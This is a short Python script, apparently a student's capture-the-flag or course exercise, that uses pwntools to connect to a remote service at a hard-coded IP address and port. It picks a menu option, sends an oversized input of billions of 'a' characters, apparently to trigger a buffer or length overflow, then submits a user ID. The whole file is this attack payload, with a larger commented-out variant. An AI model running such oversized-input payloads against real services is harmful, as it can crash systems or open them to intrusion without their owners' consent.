from pwn import remote

def main():
 
    r = remote("107.21.135.41", 3333)
    x = r.recv()
    print(x)
    #r.recvuntil(b"menu: ")
    r.sendline(b"1")
    #r.sendline(b"a"*46368296884880)
    r.sendline(b"a"*4636829688)
    r.recvuntil(b"ID: ")    
    r.sendline(b"agoyal61")
    #r.close()    

if __name__ == "__main__":
	main()  